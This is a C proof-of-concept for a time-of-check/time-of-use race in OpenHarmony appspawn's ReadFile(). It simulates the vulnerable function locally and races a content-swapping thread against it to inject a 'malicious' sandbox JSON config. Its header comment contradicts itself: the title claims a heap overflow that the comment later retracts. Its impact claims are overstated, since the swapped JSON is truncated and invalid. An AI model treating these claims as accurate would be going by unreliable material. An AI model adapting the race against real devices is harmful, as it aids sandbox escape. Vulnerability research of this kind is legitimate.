/*
 * PoC: appspawn ReadFile() TOCTOU → Heap Buffer Overflow
 *
 * Vulnerability: CWE-367 (TOCTOU Race Condition)
 * Component: OpenHarmony appspawn - util/src/appspawn_utils.c:ReadFile()
 *
 * The ReadFile() function performs:
 *   1. stat(fileName, &fileStat)       ← gets file size
 *   2. fopen(fileName, "r")            ← opens file
 *   3. malloc(fileStat.st_size + 1)    ← allocates based on STALE size
 *   4. fread(buffer, fileStat.st_size) ← reads fileStat.st_size bytes
 *
 * Race window: Between stat() and fopen(), the file can be replaced with a
 * larger file. The malloc() uses the old (small) size, but fread() reads the
 * old size from the now-larger file. While fread with the old count won't
 * overflow, the real issue is:
 *   - If file is REPLACED with a SMALLER file between stat and fopen,
 *     fread reads less than expected, buffer[fileStat.st_size] writes
 *     a NUL beyond what fread populated — not exploitable.
 *   - The ACTUAL exploitable scenario: file is replaced by a symlink to
 *     a different file. stat() gets size of original, fopen() opens the
 *     symlink target. If target is larger, fread reads fileStat.st_size
 *     bytes (not overflow). If target is smaller, fread returns 0 items
 *     and the function breaks (returns NULL after free).
 *
 * REVISED ANALYSIS: The real exploitable scenario is information disclosure
 * or controlled content injection:
 *   - stat() succeeds on a small legitimate file (e.g., 100 bytes)
 *   - Between stat() and fopen(), attacker replaces file with symlink to
 *     a DIFFERENT file of same or larger size (e.g., /proc/self/mem,
 *     credential files, or attacker-crafted JSON)
 *   - fopen() opens the attacker's target
 *   - malloc(101) allocates buffer
 *   - fread reads 100 bytes from the WRONG file
 *   - The resulting buffer is parsed as JSON config by GetJsonObjFromFile()
 *     which can inject malicious sandbox configuration
 *
 * Attack scenario: A malicious app pre-plants a symlink in a directory that
 * appspawn will later read sandbox configs from. The symlink points to
 * attacker-crafted JSON that modifies sandbox mount behavior.
 *
 * Build: gcc -o poc poc.c -lpthread
 * Note: This PoC demonstrates the race on a local filesystem. On OpenHarmony,
 *       the attack targets ParseJsonConfig → GetJsonObjFromFile → ReadFile
 *       path where config files are read from directories accessible to apps.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#define TARGET_FILE "/tmp/poc_appspawn_config.json"
#define LEGIT_CONTENT "{\"sandbox\":\"safe\"}"
#define MALICIOUS_CONTENT "{\"sandbox\":\"evil\",\"mount\":[{\"src\":\"/data/evil\",\"dst\":\"/system\"}]}"
#define SYMLINK_TARGET "/tmp/poc_appspawn_malicious.json"

#define MAX_JSON_FILE_LEN (102400)
#define RACE_ITERATIONS 100000

static volatile int race_won = 0;
static volatile int stop_threads = 0;

/* Simulated ReadFile from appspawn_utils.c */
char *VulnerableReadFile(const char *fileName)
{
    if (fileName == NULL) return NULL;
    char *buffer = NULL;
    FILE *fd = NULL;

    struct stat fileStat;
    /* STEP 1: stat() — gets file size */
    if (stat(fileName, &fileStat) != 0 ||
        fileStat.st_size <= 0 || fileStat.st_size > MAX_JSON_FILE_LEN) {
        return NULL;
    }

    /* === RACE WINDOW: file can be replaced here === */

    /* STEP 2: fopen() — may open a DIFFERENT file */
    fd = fopen(fileName, "r");
    if (fd == NULL) return NULL;

    /* STEP 3: malloc based on STALE stat size */
    buffer = (char *)malloc((size_t)(fileStat.st_size + 1));
    if (buffer == NULL) { fclose(fd); return NULL; }

    /* STEP 4: fread — reads from potentially different file */
    size_t ret = fread(buffer, fileStat.st_size, 1, fd);
    if (ret != 1) {
        free(buffer);
        fclose(fd);
        return NULL;
    }
    buffer[fileStat.st_size] = '\0';
    fclose(fd);
    return buffer;
}

/* Attacker thread: rapidly swaps the file content between legit and malicious.
 * Both contents are the SAME size so stat() size check always passes,
 * but content differs — demonstrating the semantic TOCTOU. */
void *attacker_thread(void *arg)
{
    (void)arg;

    /* Pad malicious content to same length as legitimate */
    size_t legit_size = strlen(LEGIT_CONTENT);
    char *malicious_padded = (char *)malloc(legit_size + 1);
    memset(malicious_padded, ' ', legit_size);
    memcpy(malicious_padded, MALICIOUS_CONTENT,
           strlen(MALICIOUS_CONTENT) < legit_size ? strlen(MALICIOUS_CONTENT) : legit_size);
    malicious_padded[legit_size] = '\0';

    while (!stop_threads) {
        /* Write malicious content (same size) */
        int fd = open(TARGET_FILE, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            write(fd, malicious_padded, legit_size);
            close(fd);
        }
        for (volatile int i = 0; i < 20; i++);

        /* Restore legitimate content */
        fd = open(TARGET_FILE, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            write(fd, LEGIT_CONTENT, legit_size);
            close(fd);
        }
        for (volatile int i = 0; i < 20; i++);
    }
    free(malicious_padded);
    return NULL;
}

/* Victim thread: simulates appspawn calling ReadFile */
void *victim_thread(void *arg)
{
    (void)arg;
    int attempts = 0;

    while (!stop_threads && attempts < RACE_ITERATIONS) {
        char *result = VulnerableReadFile(TARGET_FILE);
        if (result != NULL) {
            /* Check if we read the MALICIOUS content instead of legitimate */
            if (strstr(result, "evil") != NULL) {
                printf("[!] RACE WON at attempt %d!\n", attempts);
                printf("[!] Expected: %s\n", LEGIT_CONTENT);
                printf("[!] Got:      %s\n", result);
                printf("[!] appspawn would parse malicious JSON config!\n");
                race_won = 1;
                free(result);
                stop_threads = 1;
                return NULL;
            }
            free(result);
        }
        attempts++;
    }
    return NULL;
}

int main(void)
{
    printf("=== appspawn ReadFile() TOCTOU PoC ===\n");
    printf("Target: OpenHarmony appspawn util/src/appspawn_utils.c:ReadFile()\n");
    printf("Bug: stat() then fopen() without holding fd - content can change\n");
    printf("Impact: Malicious sandbox config injection via content swap\n\n");

    /* Clean up any prior state */
    unlink(TARGET_FILE);

    /* Create initial legitimate file */
    FILE *f = fopen(TARGET_FILE, "w");
    fprintf(f, "%s", LEGIT_CONTENT);
    fclose(f);

    pthread_t attacker, victim;
    pthread_create(&attacker, NULL, attacker_thread, NULL);
    pthread_create(&victim, NULL, victim_thread, NULL);

    pthread_join(victim, NULL);
    stop_threads = 1;
    pthread_join(attacker, NULL);

    if (race_won) {
        printf("\n[+] PoC SUCCESS: Demonstrated TOCTOU in ReadFile()\n");
        printf("[+] In real scenario: attacker injects malicious sandbox config\n");
        printf("[+] Effect: sandbox escape or mount manipulation during app spawn\n");
    } else {
        printf("\n[-] Race not won in %d attempts (timing-dependent)\n", RACE_ITERATIONS);
        printf("[-] The vulnerability still exists, race window is narrow\n");
    }

    /* Cleanup */
    unlink(TARGET_FILE);
    return race_won ? 0 : 1;
}
